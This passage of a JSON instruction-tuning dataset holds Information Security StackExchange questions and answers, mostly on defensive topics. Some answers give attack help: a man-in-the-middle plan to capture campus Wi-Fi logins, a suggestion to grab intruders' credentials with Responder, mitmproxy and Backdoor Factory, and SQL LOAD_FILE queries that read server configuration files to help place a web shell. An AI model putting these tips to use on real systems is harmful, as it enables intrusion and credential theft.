    "parsed_raw_data": {
      "question": "How to decode traffic on a LAN whose SSL certificates are expired\nWe have a campus Wi-Fi at my university and we authenticate through a log in page which to me seems like we are using a RADIUS server.\nEvery time the page loads my browser warns me that the certificate(s) being used are expired/not valid.\nIs there any way to capturer the authentication data (login and password) off the network and decode it since the SSL certificate(s) is expired?",
      "answer": "The expired certificate itself wouldn't really allow you to decrypt the data, but it does open up a major \"vulnerability\", albeit it's more of a social one - most users are now accustomed to ignoring certificate warnings from their browsers.  Thus, if you perform a man-in-the-middle attack most users will probably click straight through the certificate warning, allowing you to capture their data.  They probably won't notice that the warning is slightly different from previous ones or that the certificate is different."
    }
  },
  {
    "instruction": "Answer the following question:\n\nWhy is WPA Enterprise more secure than WPA2?\nIn personal mode WPA2 is more secure than WPA. However, I have read that WPA Enterprise provides stronger security than WPA2 and I am unsure exactly how this is achieved.",
    "context": "",
    "output": "WPA2 is more secure than WPA as explained by Terry. You just need to understand the difference between personal (pre shared key) and enterprise versions of both the protocols.\nThe personal version is where all the users share a secret password that is configured in the access point. In the enterprise version there is a central authentication server and all the users have different sets of credentials that they use in order to access WiFi. So basically there is no single shared password.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Why is WPA Enterprise more secure than WPA2?\nIn personal mode WPA2 is more secure than WPA. However, I have read that WPA Enterprise provides stronger security than WPA2 and I am unsure exactly how this is achieved.",
      "answer": "WPA2 is more secure than WPA as explained by Terry. You just need to understand the difference between personal (pre shared key) and enterprise versions of both the protocols.\nThe personal version is where all the users share a secret password that is configured in the access point. In the enterprise version there is a central authentication server and all the users have different sets of credentials that they use in order to access WiFi. So basically there is no single shared password."
    }
  },
  {
    "instruction": "Q: How big is a canary word on Linux, typically?\nA canary word is a sequence of bits placed at the boundary between a buffer (such as a stack) and control data in a program, as a way of detecting and reacting to buffer overflows.\nHow many bits long are these canaries on Linux, usually?",
    "context": "",
    "output": " A: As i can read in this page: Stack Smashing Protector\n\nThe stack canary is native word sized and if chosen randomly, an attacker will have to guess the right value among 2^32 or 2^64 combinations",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How big is a canary word on Linux, typically?\nA canary word is a sequence of bits placed at the boundary between a buffer (such as a stack) and control data in a program, as a way of detecting and reacting to buffer overflows.\nHow many bits long are these canaries on Linux, usually?",
      "answer": "As i can read in this page: Stack Smashing Protector\n\nThe stack canary is native word sized and if chosen randomly, an attacker will have to guess the right value among 2^32 or 2^64 combinations"
    }
  },
  {
    "instruction": "Q: How to log into sites that you have set up Google 2 Step Authenticator if you lose your phone?\nIf you use Google Authenticator to log into sites using 2 Factor Authentication, how do you log in after you lose your phone?\nCan you install Google Authenticator on another device?",
    "context": "",
    "output": " A: You can install Google Authenticator on another device. However, that new application will not have access to the prior secret shared between the server and your phone.\nIn Google's case, they recommend printing out backup passwords and keeping them somewhere safe in the event anything happens. It is up to other sites using Google Authenticator as a means of 2FA authentication to provide similar ways of recovering from such a loss. The HOTP and TOTP algorithms themselves do not allow for any recovery.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How to log into sites that you have set up Google 2 Step Authenticator if you lose your phone?\nIf you use Google Authenticator to log into sites using 2 Factor Authentication, how do you log in after you lose your phone?\nCan you install Google Authenticator on another device?",
      "answer": "You can install Google Authenticator on another device. However, that new application will not have access to the prior secret shared between the server and your phone.\nIn Google's case, they recommend printing out backup passwords and keeping them somewhere safe in the event anything happens. It is up to other sites using Google Authenticator as a means of 2FA authentication to provide similar ways of recovering from such a loss. The HOTP and TOTP algorithms themselves do not allow for any recovery."
    }
  },
  {
    "instruction": "Please answer this question: How to prevent network administrators from accessing USB drive\nHow can I prevent network administrators from accessing, mapping to etc. a USB drive that's in a PC on their network? \nI'm mainly concerned about files being edited or deleted.",
    "context": "",
    "output": "Seems pretty obvious that you could just disconnect the network cable. Plug in the USB, Dump/Upload files, eject the USB, then reconnect to the network.\nThis should prevent them from having any kind of access to the drive (read or write)\nUnless they own the computers AND have some mechanism to download everything on any connected usb device (which is highly unlikely), there isn't much they can do on a machine that's not connected to their net...\nNot exactly high tech, but it will certainly do the trick.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How to prevent network administrators from accessing USB drive\nHow can I prevent network administrators from accessing, mapping to etc. a USB drive that's in a PC on their network? \nI'm mainly concerned about files being edited or deleted.",
      "answer": "Seems pretty obvious that you could just disconnect the network cable. Plug in the USB, Dump/Upload files, eject the USB, then reconnect to the network.\nThis should prevent them from having any kind of access to the drive (read or write)\nUnless they own the computers AND have some mechanism to download everything on any connected usb device (which is highly unlikely), there isn't much they can do on a machine that's not connected to their net...\nNot exactly high tech, but it will certainly do the trick."
    }
  },
  {
    "instruction": "Please answer this question: PCI-DSS Is the infrastructure really in-scope?\nSay I have an application that takes credit cards, but this is actually a payment gateway on the internet that I don't control.\nThe web site used HTTPS and only returns if the card was authorized or not and stores the last 4 digits of the PAN.  \nWith this setup, how much, if any, of the infrastructure is really in-scope?",
    "context": "",
    "output": "PCI-DSS only applies to computers and systems that handle PCI (Payment Card Industry) information.  If it is handled by a third party and you are only given a receipt token, then no PCI data is being handled by your system and it doesn't fall under PCI-DSS.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "PCI-DSS Is the infrastructure really in-scope?\nSay I have an application that takes credit cards, but this is actually a payment gateway on the internet that I don't control.\nThe web site used HTTPS and only returns if the card was authorized or not and stores the last 4 digits of the PAN.  \nWith this setup, how much, if any, of the infrastructure is really in-scope?",
      "answer": "PCI-DSS only applies to computers and systems that handle PCI (Payment Card Industry) information.  If it is handled by a third party and you are only given a receipt token, then no PCI data is being handled by your system and it doesn't fall under PCI-DSS."
    }
  },
  {
    "instruction": "Q: How an AP blocks Admin Page through Wi-Fi connection?\nSome home routers (AP) have the ability to block connections to the admin page if it's being accessed through a Wi-Fi connection. In order to login to the admin page you need to get a cable and connect to the network.\n\nHow does the web page/service (80 or 443) knows this?\nHow secure (easy to circumvent) is it?\n\nIs it trough the hardware, firmware or software? Even tho it looks kind of obvious because the router serves both (Wi-Fi and web admin page) I can't get my head around it because of the OSI layers.",
    "context": "",
    "output": " A: Firewalls can look across layers. Assume you're on a Linux system where eth0 is your LAN and wlan0 is your WLAN, and they're both bridged into br0. The following iptables rule would then do it:\niptables -I INPUT -p tcp -m multiport --dports 80,443 -i br0 -m physdev --physdev-in wlan0 -j DROP",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How an AP blocks Admin Page through Wi-Fi connection?\nSome home routers (AP) have the ability to block connections to the admin page if it's being accessed through a Wi-Fi connection. In order to login to the admin page you need to get a cable and connect to the network.\n\nHow does the web page/service (80 or 443) knows this?\nHow secure (easy to circumvent) is it?\n\nIs it trough the hardware, firmware or software? Even tho it looks kind of obvious because the router serves both (Wi-Fi and web admin page) I can't get my head around it because of the OSI layers.",
      "answer": "Firewalls can look across layers. Assume you're on a Linux system where eth0 is your LAN and wlan0 is your WLAN, and they're both bridged into br0. The following iptables rule would then do it:\niptables -I INPUT -p tcp -m multiport --dports 80,443 -i br0 -m physdev --physdev-in wlan0 -j DROP"
    }
  },
  {
    "instruction": "What is the answer to this question - How does Cryptolocker propagate?\nOne of the computers in my office has been compromised by Cryptolocker.  Once informed, my immediate response was to disconnect the computer from the network - though there was a period of a few hours in which I was not aware of the issue.\nThe infected computer was connected to a NAS drive, as well as multiple computers on the network.  The NAS drive is publicly accessible, and some of the files therein were encrypted.  The computers require separate access credentials, and do not appear to have been infected.\nIn this situation, are the other computers currently at risk of being infected?  How exactly does Cryptolocker (or similar ransomware) propagate through networks? Could something have been done to better secure the NAS drive?\n\n",
    "context": "",
    "output": "To answer the NAS portion of the question: the typical CryptoLocker behaviour is to crawl all connected drives (local and network mapped drives), which would include a connected NAS. \nProtect the NAS by:\n\nNot keeping it mounted\nBackups that you can restore even if the entire NAS gets compromised",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How does Cryptolocker propagate?\nOne of the computers in my office has been compromised by Cryptolocker.  Once informed, my immediate response was to disconnect the computer from the network - though there was a period of a few hours in which I was not aware of the issue.\nThe infected computer was connected to a NAS drive, as well as multiple computers on the network.  The NAS drive is publicly accessible, and some of the files therein were encrypted.  The computers require separate access credentials, and do not appear to have been infected.\nIn this situation, are the other computers currently at risk of being infected?  How exactly does Cryptolocker (or similar ransomware) propagate through networks? Could something have been done to better secure the NAS drive?",
      "answer": "To answer the NAS portion of the question: the typical CryptoLocker behaviour is to crawl all connected drives (local and network mapped drives), which would include a connected NAS. \nProtect the NAS by:\n\nNot keeping it mounted\nBackups that you can restore even if the entire NAS gets compromised"
    }
  },
  {
    "instruction": "Question: Unknown suspects hijacking our WiFi. Caught their MAC addresses\nI noticed our Internet was bogged down.  I checked the IP addresses of all devices connected and found the MAC addresses of the culprits:\n\nQuestion: How to find their geographical location based on the MAC addresses?\nI know they are in the neighborhood of Columbia, Md. 21045.  One of them is an iPhone and another is an Android phone which would should allow GPS triangulation, but that option is only available to the carrier and law enforcement.",
    "context": "",
    "output": "Answer: Physically finding them is not easy. If you are really willing to catch them, buy a couple ESP8266 modules (search eBay for them), research this project a little, drop a couple modules around and you can probably find them. But will cost a lot of time, effort and some money.\nEven if you cannot physically locate them, you can play some tricks with them:\n\nInstall a captive portal, saying the network is an experiment on automated hacking and ask user to only continue if they agree. Ask for email or Facebook auth, or ask for a phone number to send a PIN to login. \nInstall something like Upside Down Ternet, Backdoor Factory or AutoPwn.\nPut QoS in place on your router, and 1kbps bandwidth for anyone outside of a list.\nInstall Responder along with mitmproxy, get all auth data you can.\n\nMy network is pretty secure, but sometimes I think about installing a WEP wifi network just to play around with internet thieves.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Unknown suspects hijacking our WiFi. Caught their MAC addresses\nI noticed our Internet was bogged down.  I checked the IP addresses of all devices connected and found the MAC addresses of the culprits:\n\nQuestion: How to find their geographical location based on the MAC addresses?\nI know they are in the neighborhood of Columbia, Md. 21045.  One of them is an iPhone and another is an Android phone which would should allow GPS triangulation, but that option is only available to the carrier and law enforcement.",
      "answer": "Physically finding them is not easy. If you are really willing to catch them, buy a couple ESP8266 modules (search eBay for them), research this project a little, drop a couple modules around and you can probably find them. But will cost a lot of time, effort and some money.\nEven if you cannot physically locate them, you can play some tricks with them:\n\nInstall a captive portal, saying the network is an experiment on automated hacking and ask user to only continue if they agree. Ask for email or Facebook auth, or ask for a phone number to send a PIN to login. \nInstall something like Upside Down Ternet, Backdoor Factory or AutoPwn.\nPut QoS in place on your router, and 1kbps bandwidth for anyone outside of a list.\nInstall Responder along with mitmproxy, get all auth data you can.\n\nMy network is pretty secure, but sometimes I think about installing a WEP wifi network just to play around with internet thieves."
    }
  },
  {
    "instruction": "Answer this question:\n\nHow can I prevent my kids from bypassing my computer restrictions?\nMy son has a downloaded copy of Ubuntu that he uses to \"break\" into my computer, bypassing Vista. I have two questions:\n\nCan this damage my computer or corrupt my files? (I have lots of pictures)\nIs there a way for me to block this disc from working as there are strict rules in our house for usage time on the computer and time limits?",
    "context": "",
    "output": "A: Your \"strict rules\" aren't very strict if you can't enforce them.  I would suggest, depending on the age of your son, that you start enforcing your rules by attaching consequences to breaking them.  You might look at options such as taking away his allowance or driving privileges, taking away his cellphone (or not paying for his access), or grounding him.  The problem is not a computer problem or even a security problem: the problem is behavioral, and if he refuses to obey you he clearly does not respect you.  Unless this is a joke or a game, he is headed for trouble as he grows older.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How can I prevent my kids from bypassing my computer restrictions?\nMy son has a downloaded copy of Ubuntu that he uses to \"break\" into my computer, bypassing Vista. I have two questions:\n\nCan this damage my computer or corrupt my files? (I have lots of pictures)\nIs there a way for me to block this disc from working as there are strict rules in our house for usage time on the computer and time limits?",
      "answer": "Your \"strict rules\" aren't very strict if you can't enforce them.  I would suggest, depending on the age of your son, that you start enforcing your rules by attaching consequences to breaking them.  You might look at options such as taking away his allowance or driving privileges, taking away his cellphone (or not paying for his access), or grounding him.  The problem is not a computer problem or even a security problem: the problem is behavioral, and if he refuses to obey you he clearly does not respect you.  Unless this is a joke or a game, he is headed for trouble as he grows older."
    }
  },
  {
    "instruction": "Question: Detecting attempts to manipulate help desk support\nIf users forget their password, lose their one-time-password tokens, or otherwise become unable to access their accounts, they call the help desk. \nIn certain circumstances, help desk support is allowed to set a temporary password and suspend multi-factor requirements. This is kept to a minimum, but is unavoidable. As far as we can tell, nothing malicious has been done. Yet.\nI was thinking of adding a step for the help desk team to note certain details every time they have to do this (time, account, phone number, ...) and following up with the account holder to make sure everything is OK, but this could leave hours of an attacker having access to a system.    \nIs there a standard approach to detecting someone maliciously getting a password reset to gain illegitimate access to an account? \nIs there a way I could restrict the permissions of any account that had a password reset or multi-factor suspension automatically?",
    "context": "",
    "output": "Answer: I'm not sure about \"standard\", but my company does the following:\n\nUser forgets password\nUser calls IT / Help Desk / etc.\nIT gathers basic info for making sure the user exists (name, branch, office, etc.)\nIT says \"Thanks, we'll get right back to you\" and hangs up\nIT calls back the user on the desk-number / cell-number listed for them in the corporate directory. (odds are if the attack has pwned these already, there's a much bigger problem...)\nUser picks up, IT vocally confirms their password request, and if it is confirmed, gives the one-time-password. If it is not confirmed, IT forwards the event to our security team.\n\nThis way, the IT desk has a much lower chance of being socially engineered into giving passwords orally to someone over the phone, even if they have all of the victims corporate info (barring physical access to their phone).",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Detecting attempts to manipulate help desk support\nIf users forget their password, lose their one-time-password tokens, or otherwise become unable to access their accounts, they call the help desk. \nIn certain circumstances, help desk support is allowed to set a temporary password and suspend multi-factor requirements. This is kept to a minimum, but is unavoidable. As far as we can tell, nothing malicious has been done. Yet.\nI was thinking of adding a step for the help desk team to note certain details every time they have to do this (time, account, phone number, ...) and following up with the account holder to make sure everything is OK, but this could leave hours of an attacker having access to a system.    \nIs there a standard approach to detecting someone maliciously getting a password reset to gain illegitimate access to an account? \nIs there a way I could restrict the permissions of any account that had a password reset or multi-factor suspension automatically?",
      "answer": "I'm not sure about \"standard\", but my company does the following:\n\nUser forgets password\nUser calls IT / Help Desk / etc.\nIT gathers basic info for making sure the user exists (name, branch, office, etc.)\nIT says \"Thanks, we'll get right back to you\" and hangs up\nIT calls back the user on the desk-number / cell-number listed for them in the corporate directory. (odds are if the attack has pwned these already, there's a much bigger problem...)\nUser picks up, IT vocally confirms their password request, and if it is confirmed, gives the one-time-password. If it is not confirmed, IT forwards the event to our security team.\n\nThis way, the IT desk has a much lower chance of being socially engineered into giving passwords orally to someone over the phone, even if they have all of the victims corporate info (barring physical access to their phone)."
    }
  },
  {
    "instruction": "What is the answer to this question - Password security when connecting to ldap with rails application\nHow do you store a username/password securely in a rails app when using it for many ldap searches?\nThe connection in the app requires \nldap_bind_authenticate(Net::LDAP.new, username, password)\n\neach time a search is made, and the credentials of the user are not stored at logon. I often see developers using a test user for the searches and storing a plaintext username/password pair in the user.rb model. Is there a more secure way to do this?\n\n",
    "context": "",
    "output": "Disclaimer: I have never used ruby / ruby on rails and in this answer I describe how I would act in general.\nYou have two ways to solve this problem:\n\nUse an additional user for all your searches.\n\nPro: You don't have to store the users credentials after he/she logged in.\nCon: I don't know if this matters in your application but you can't track which user has started a caused the query based on your LDAP logs.\nImplementation: Your have to store sensitive credentials for an external service inside your application. This is the exact same problem as with database credentials so I think you should store your LDAP credentials in the same manner as them.\n\nUse the logged in user for searches\n\nPro: You can track what every user has done using your LDAP logs\nCon: You have to store the unencrypted user information somewhere while the user is logged in.\nImplementation: Save the unencrypted user information in the session or something so you can access them when you need to.\n\n\nPersonally I would prefer the first solution as it does not involve storing a lot of plaintext user passwords somewhere.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Password security when connecting to ldap with rails application\nHow do you store a username/password securely in a rails app when using it for many ldap searches?\nThe connection in the app requires \nldap_bind_authenticate(Net::LDAP.new, username, password)\n\neach time a search is made, and the credentials of the user are not stored at logon. I often see developers using a test user for the searches and storing a plaintext username/password pair in the user.rb model. Is there a more secure way to do this?",
      "answer": "Disclaimer: I have never used ruby / ruby on rails and in this answer I describe how I would act in general.\nYou have two ways to solve this problem:\n\nUse an additional user for all your searches.\n\nPro: You don't have to store the users credentials after he/she logged in.\nCon: I don't know if this matters in your application but you can't track which user has started a caused the query based on your LDAP logs.\nImplementation: Your have to store sensitive credentials for an external service inside your application. This is the exact same problem as with database credentials so I think you should store your LDAP credentials in the same manner as them.\n\nUse the logged in user for searches\n\nPro: You can track what every user has done using your LDAP logs\nCon: You have to store the unencrypted user information somewhere while the user is logged in.\nImplementation: Save the unencrypted user information in the session or something so you can access them when you need to.\n\n\nPersonally I would prefer the first solution as it does not involve storing a lot of plaintext user passwords somewhere."
    }
  },
  {
    "instruction": "Answer the question below.\nHow does CORS prevent XSS?\nI recently learned about CORS and got the impression that its purpose is to prevent XSS. With CORS, the browser blocks requests to different domains, unless particular headers are in place.\nBut if a person with malicious intent injects some JavaScript into a page to steal users' cookies and send them to a URL he controls, all he has to do is add the following header on the server side to make the request work anyway:\nAccess-Control-Allow-Origin: *\n\nSo how does CORS prevent XSS? Or did I misunderstand the purpose of CORS, and it simply has nothing to do with XSS per se?",
    "context": "",
    "output": "Cross-Site-Scripting (XSS) is the execution of attacker defined script code in the context of another site. CORS does not prevent XSS, in fact it is unrelated to XSS.\nInstead CORS offers a way to weaken existing restrictions on Ajax requests (i.e. XMLHttpRequest) in a way which hopefully does not introduce more security problems. Traditionally XMLHttpRequest was restricted to communicate within the same origin, that is it was not possible to sent a request to some external site. This restriction was done so that an attacker cannot do a cross site request  and get the result of the request back, because this would allow an attacker to read data from sites where the users was logged in (because session and other cookies are sent with each request to a site).\nWith CORS this restriction is partly removed. It is now possible to send an XMLHttpRequest to another site but the result can only read inside the application if the remote site explicitly added some CORS headers which allow the access. But again, this is not executing script on the remote site and thus this is unrelated to XSS.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How does CORS prevent XSS?\nI recently learned about CORS and got the impression that its purpose is to prevent XSS. With CORS, the browser blocks requests to different domains, unless particular headers are in place.\nBut if a person with malicious intent injects some JavaScript into a page to steal users' cookies and send them to a URL he controls, all he has to do is add the following header on the server side to make the request work anyway:\nAccess-Control-Allow-Origin: *\n\nSo how does CORS prevent XSS? Or did I misunderstand the purpose of CORS, and it simply has nothing to do with XSS per se?",
      "answer": "Cross-Site-Scripting (XSS) is the execution of attacker defined script code in the context of another site. CORS does not prevent XSS, in fact it is unrelated to XSS.\nInstead CORS offers a way to weaken existing restrictions on Ajax requests (i.e. XMLHttpRequest) in a way which hopefully does not introduce more security problems. Traditionally XMLHttpRequest was restricted to communicate within the same origin, that is it was not possible to sent a request to some external site. This restriction was done so that an attacker cannot do a cross site request  and get the result of the request back, because this would allow an attacker to read data from sites where the users was logged in (because session and other cookies are sent with each request to a site).\nWith CORS this restriction is partly removed. It is now possible to send an XMLHttpRequest to another site but the result can only read inside the application if the remote site explicitly added some CORS headers which allow the access. But again, this is not executing script on the remote site and thus this is unrelated to XSS."
    }
  },
  {
    "instruction": "Answer the following question:\n\nIs it possible to locate web document root using SQL query/SQL Injection?\nI have access to MySQL database which the current user has FILE privilege. I want to upload a web shell but I do not know the root directory of the web server.\nIs it possible to somehow locate the root directory using a SQL query?",
    "context": "",
    "output": "If you have permissions to write files, you probably have permission to read them, too.\nI'd start from reading web server configuration files, e.g.\nSELECT * LOAD_FILE('/etc/apache2/apache2.conf');\nSELECT * LOAD_FILE('/etc/nginx/nginx.conf');\n\nHowever, it's not guaranteed that the MySQL has permissions to write to the document root.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is it possible to locate web document root using SQL query/SQL Injection?\nI have access to MySQL database which the current user has FILE privilege. I want to upload a web shell but I do not know the root directory of the web server.\nIs it possible to somehow locate the root directory using a SQL query?",
      "answer": "If you have permissions to write files, you probably have permission to read them, too.\nI'd start from reading web server configuration files, e.g.\nSELECT * LOAD_FILE('/etc/apache2/apache2.conf');\nSELECT * LOAD_FILE('/etc/nginx/nginx.conf');\n\nHowever, it's not guaranteed that the MySQL has permissions to write to the document root."
    }
  },
  {
    "instruction": "Answer this question:\n\nYubikey: How is the OpenPGP key secured by PIN and passphrase?\nUsing the Yubikey 4 as an OpenPGP smartcard with GnuPG: How is the user PIN and user passphrase secured?\n\nIn case a sophisticated attacker with physical access to the Yubikey 4 manages to physicaly extract the private-key under the microscope without knowing the user PIN and user passphrase:\n\nWhat encryption (cipher, mode, hashing, etc.) is in place at this \"last resort\" to protect the private-key?\nIs this very last cryptographic barrier made from GnuPG code or does the Yubikey manufacturer coded his own version?\n\nSince Yubikey 4 states its a compatible OpenPGP smartcard  - does it mean it has the same PIN/passphrase protection as the G10 Smartcard?",
    "context": "",
    "output": "A: Given there was a bug allowing you to use the private key without the PIN (passphrase) being validated, I derive the card does not actually encrypt the private keys (like it would have been done when using \"normal\" keys with passphrase protection with GnuPG):\n\nThe source code contains a logical flaw related to user PIN (aka PW1) verification that allows an attacker with local host privileges and/or physical proximity (NFC) to perform security operations without knowledge of the user\u2019s PIN code.\n\nI'm not aware this changed, but only the verification was fixed in current releases. With other words, the secret keys on a YubiKey are stored unencrypted, and sophisticated attackers able to read the key's storage are able to extract the unencrypted private keys.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Yubikey: How is the OpenPGP key secured by PIN and passphrase?\nUsing the Yubikey 4 as an OpenPGP smartcard with GnuPG: How is the user PIN and user passphrase secured?\n\nIn case a sophisticated attacker with physical access to the Yubikey 4 manages to physicaly extract the private-key under the microscope without knowing the user PIN and user passphrase:\n\nWhat encryption (cipher, mode, hashing, etc.) is in place at this \"last resort\" to protect the private-key?\nIs this very last cryptographic barrier made from GnuPG code or does the Yubikey manufacturer coded his own version?\n\nSince Yubikey 4 states its a compatible OpenPGP smartcard  - does it mean it has the same PIN/passphrase protection as the G10 Smartcard?",
      "answer": "Given there was a bug allowing you to use the private key without the PIN (passphrase) being validated, I derive the card does not actually encrypt the private keys (like it would have been done when using \"normal\" keys with passphrase protection with GnuPG):\n\nThe source code contains a logical flaw related to user PIN (aka PW1) verification that allows an attacker with local host privileges and/or physical proximity (NFC) to perform security operations without knowledge of the user\u2019s PIN code.\n\nI'm not aware this changed, but only the verification was fixed in current releases. With other words, the secret keys on a YubiKey are stored unencrypted, and sophisticated attackers able to read the key's storage are able to extract the unencrypted private keys."
    }
  },
  {
    "instruction": "Answer the question below.\nAre there open databases or sites similar to xssed.com, not necessarily about XSS?\nAre there open databases, websites similar to xssed.com that are not necessarily about XSS, but where people report SQL inject-able websites or malware infected websites, for example?\nPotentially with an Application Programming Interface (API)?",
    "context": "",
    "output": "You are probably looking for xssposed.org, a successor website for xssed.com (actually they imported the old xssed database), and which was renamed to Open Bug Bounty a few months ago.\nThey list XSS and open redirects.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Are there open databases or sites similar to xssed.com, not necessarily about XSS?\nAre there open databases, websites similar to xssed.com that are not necessarily about XSS, but where people report SQL inject-able websites or malware infected websites, for example?\nPotentially with an Application Programming Interface (API)?",
      "answer": "You are probably looking for xssposed.org, a successor website for xssed.com (actually they imported the old xssed database), and which was renamed to Open Bug Bounty a few months ago.\nThey list XSS and open redirects."
    }
  },
  {
    "instruction": "Answer the question below.\nRunning HTTPS service on port 443\nAccording to the Alexa Skills Documentation, I will get an unexpected communication issue if\nThe endpoint is not configured to accept traffic over port 443.\n\nI'm trying to do this with my home router. Does this mean I need to change the port of my home router off of 443 to something else, and then launch an https webserver on port 443?",
    "context": "",
    "output": "If you are running the service from your home then it will need to listen on port 443.  You will need to open this port on your allowed incoming traffic of your router.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Running HTTPS service on port 443\nAccording to the Alexa Skills Documentation, I will get an unexpected communication issue if\nThe endpoint is not configured to accept traffic over port 443.\n\nI'm trying to do this with my home router. Does this mean I need to change the port of my home router off of 443 to something else, and then launch an https webserver on port 443?",
      "answer": "If you are running the service from your home then it will need to listen on port 443.  You will need to open this port on your allowed incoming traffic of your router."
    }
  },
  {
    "instruction": "Answer the following question:\n\nPE file export functions of packed file\nI am new to reverse engineering and I am learning about packed files.\nI saw that most of the time I can recognize a packed file with a little number of import functions in PE file and not many strings but can the export functions in PE file can give me hint if a file been packed?",
    "context": "",
    "output": "The presence or absence of exports alone is not enough to tell if a file is packed or unpacked. Most executables have no or very few exports but there are also legitimate executables with many exports. Packing can hide exports but might also leave them visible so it\u2019s not a reliable indicator either way. \nIt\u2019s better to use other means of detecting packed files: entropy, signatures, runtime analysis and so on.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "PE file export functions of packed file\nI am new to reverse engineering and I am learning about packed files.\nI saw that most of the time I can recognize a packed file with a little number of import functions in PE file and not many strings but can the export functions in PE file can give me hint if a file been packed?",
      "answer": "The presence or absence of exports alone is not enough to tell if a file is packed or unpacked. Most executables have no or very few exports but there are also legitimate executables with many exports. Packing can hide exports but might also leave them visible so it\u2019s not a reliable indicator either way. \nIt\u2019s better to use other means of detecting packed files: entropy, signatures, runtime analysis and so on."
    }
  },
  {
    "instruction": "Question: Is GNU shred relevant for SSDs?\nThe Gutmann method,  which apparently is used by GNU shred, has appeared in 1996, which focused on finding random 5 to 31 patterns and taking into account particular magnetic encoding. Considering that now we have SSDs, I'm guessing that Gutmann method isn't relevant for that storage architecture, as SSDs use NAND memory rather than magnetic encoding. Does this then make shred obsolete/overkill as far as SSDs are concerned ?",
    "context": "",
    "output": "Answer: The Gutmann method is not useful for any modern device, whether a hard drive or a solid state drive. The fact that you cannot safely wipe a solid state drive due to wear leveling is irrelevant. For any modern hard drive, the best way to erase data on it is to wipe it once with a random pattern. For modern solid state drives, there is no effective way to wipe it without using SED or TRIM.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is GNU shred relevant for SSDs?\nThe Gutmann method,  which apparently is used by GNU shred, has appeared in 1996, which focused on finding random 5 to 31 patterns and taking into account particular magnetic encoding. Considering that now we have SSDs, I'm guessing that Gutmann method isn't relevant for that storage architecture, as SSDs use NAND memory rather than magnetic encoding. Does this then make shred obsolete/overkill as far as SSDs are concerned ?",
      "answer": "The Gutmann method is not useful for any modern device, whether a hard drive or a solid state drive. The fact that you cannot safely wipe a solid state drive due to wear leveling is irrelevant. For any modern hard drive, the best way to erase data on it is to wipe it once with a random pattern. For modern solid state drives, there is no effective way to wipe it without using SED or TRIM."
    }
  },
  {
    "instruction": "What is the answer to this question - Unsubscribe safely\nI have heard that is better to never click to any link in an email. Is it a bad idea to click to a unsubscribe link? What is the best way to unsubscribe to undesired mails?\n\n",
    "context": "",
    "output": "You should not click on any links. By clicking on the \"unsubscribe\" link you probably get marked as \"Active Reader\" which is willing to interact. You also get on the page of the sender, which might could infect you with malware.\nRemember: With clicking on any link you've confirmed to the sender that your email address is both valid and in active use.\nJust delete and ignore it. Your email then might get marked as \"inactive\".",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Unsubscribe safely\nI have heard that is better to never click to any link in an email. Is it a bad idea to click to a unsubscribe link? What is the best way to unsubscribe to undesired mails?",
      "answer": "You should not click on any links. By clicking on the \"unsubscribe\" link you probably get marked as \"Active Reader\" which is willing to interact. You also get on the page of the sender, which might could infect you with malware.\nRemember: With clicking on any link you've confirmed to the sender that your email address is both valid and in active use.\nJust delete and ignore it. Your email then might get marked as \"inactive\"."
    }
  },
  {
    "instruction": "Q: How do Cloud Encryption Gateways and CASB work?\nCloud Encryption Gateways (CEG) and Cloud Access Security Brokers(CASB) are becoming popular to ensure the security and confidentiality of the data leaving to Cloud Service Providers.  How do they provide such services on the data leaving the organization at the gateway ? Do they do TLSProxy/SSLProxy for the traffic ?",
    "context": "",
    "output": " A: CASBs are on premises or cloud based security policy enforcement points which are placed between consumers of cloud services and cloud service providers.\n\nCASB reside between cloud services and their users and intercepts the sensitive data and replace it with tokens or encrypted values before it is passed to the cloud for processing and storage. CASB can reside on premise as a gateway. For better understanding, see diagrammatic representation.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How do Cloud Encryption Gateways and CASB work?\nCloud Encryption Gateways (CEG) and Cloud Access Security Brokers(CASB) are becoming popular to ensure the security and confidentiality of the data leaving to Cloud Service Providers.  How do they provide such services on the data leaving the organization at the gateway ? Do they do TLSProxy/SSLProxy for the traffic ?",
      "answer": "CASBs are on premises or cloud based security policy enforcement points which are placed between consumers of cloud services and cloud service providers.\n\nCASB reside between cloud services and their users and intercepts the sensitive data and replace it with tokens or encrypted values before it is passed to the cloud for processing and storage. CASB can reside on premise as a gateway. For better understanding, see diagrammatic representation."
    }
  },
  {
    "instruction": "Question: Can visiting a website virus your computer if you have JavaScript disabled?\nLet's say I visit a website that could potentially infect my computer by just from visiting it. If I disable JavaScript, is it still possible to infect my computer?\nI have already searched the site for this question, but I only find questions like this that don't mention disabling JavaScript",
    "context": "",
